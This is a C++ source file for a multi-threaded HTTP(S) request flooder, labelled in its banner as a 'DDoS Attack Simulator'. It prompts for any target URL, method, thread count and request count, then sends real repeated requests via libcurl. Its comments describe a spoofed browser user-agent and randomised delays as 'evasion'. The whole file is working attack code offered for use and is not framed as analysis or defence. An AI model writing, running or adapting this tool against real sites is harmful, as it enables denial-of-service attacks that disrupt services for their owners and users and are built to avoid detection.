#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <thread>
#include <chrono>
#include <curl/curl.h>

using namespace std;
using namespace chrono;

#define CYAN    "\033[1;36m"
#define GREEN   "\033[1;32m"
#define RED     "\033[1;31m"
#define YELLOW  "\033[1;33m"
#define RESET   "\033[0m"
#define BOLD    "\033[1m"
#define UNDERLINE "\033[4m"

// Print stylized headers for the hacking vibe
void print_banner() {
    cout << CYAN << R"(
 ____ _           _    _           ____   ____ ____  
|  _ \ |_   _ ___| | _| |__   __ _ |  _ \ / ___|  _ \ 
| |_) | | | | / __| |/ / '_ \ / _` || |_) | |   | |_) |
|  __/| |_| | \__ \   <| | | | (_| ||  __/| |___|  __/ 
|_|    \__,_|\___|_|\_\_| |_|\__,_||_|    \____|_|    
                                                        
[+] DDoS Attack Simulator v1.0 [Power Mode]  🔥
    )" << RESET;
}

// Function to simulate DDoS attack on HTTPS
void https_attack(const string& url, const string& method, int id, int count, ofstream& log) {
    CURL *curl;
    CURLcode res;
    int success = 0;
    double total_time = 0;

    curl_global_init(CURL_GLOBAL_ALL);

    for (int i = 0; i < count; i++) {
        curl = curl_easy_init();
        if(curl) {
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
            curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);

            // Optional random user-agent for evasion
            string user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
            curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent.c_str());

            auto start = high_resolution_clock::now();
            res = curl_easy_perform(curl);
            auto end = high_resolution_clock::now();

            if(res == CURLE_OK) {
                success++;
                double rtt = duration_cast<milliseconds>(end - start).count();
                total_time += rtt;
                cout << GREEN << "[T" << id << "] Attack Success (" << rtt << "ms)" << RESET << endl;
            } else {
                cout << RED << "[T" << id << "] Failed: " << curl_easy_strerror(res) << RESET << endl;
            }
            curl_easy_cleanup(curl);

            // Optional random sleep to mimic evasion patterns (not too short)
            this_thread::sleep_for(chrono::milliseconds(10 + rand() % 20));
        }
    }

    curl_global_cleanup();

    double avg_time = (count > 0) ? total_time / count : 0;
    log << "[Thread " << id << "] Success: " << success << ", Avg RTT: " << avg_time << "ms\n";

    cout << YELLOW << "[T" << id << "] Attack Completed. Success Rate: " << success << "/" << count << RESET << endl;
}

int main() {
    print_banner();

    string url, method;
    int threads, per_thread;

    // Take inputs for the attack
    cout << CYAN << "[+] Target full URL (e.g. https://yourdomain.com): " << RESET;
    cin >> url;
    cout << CYAN << "[+] Method (GET/POST/HEAD): " << RESET;
    cin >> method;
    cout << CYAN << "[+] Threads: " << RESET;
    cin >> threads;
    cout << CYAN << "[+] Requests per thread: " << RESET;
    cin >> per_thread;

    cout << GREEN << "[✔] Attack starting..." << RESET << endl;

    // Start multi-threaded attack
    ofstream log("https_attack_metrics.log");
    vector<thread> workers;
    for (int i = 0; i < threads; i++) {
        workers.emplace_back(https_attack, url, method, i + 1, per_thread, ref(log));
    }

    for (auto& t : workers) t.join();
    log.close();

    cout << YELLOW << "[✔] Test complete. Logs saved to https_attack_metrics.log" << RESET << endl;
    return 0;
}
